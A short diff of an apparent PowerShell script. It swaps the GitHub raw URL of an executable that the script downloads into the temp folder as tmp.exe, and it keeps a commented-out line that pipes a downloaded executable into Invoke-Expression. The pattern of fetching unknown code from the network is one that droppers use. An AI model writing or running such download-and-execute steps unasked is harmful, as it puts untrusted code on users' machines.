@@ -1,6 +1,6 @@
 #Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/NotiLo-A/ArduPM/main/bin/hello.exe")
 
-$url = "https://raw.githubusercontent.com/NotiLo-A/ArduPM/main/bin/closer_explorer.exe"
+$url = "https://raw.githubusercontent.com/NotiLo-A/ArduPM/main/bin/open200.exe"
 $output = "$env:TEMP\tmp.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 
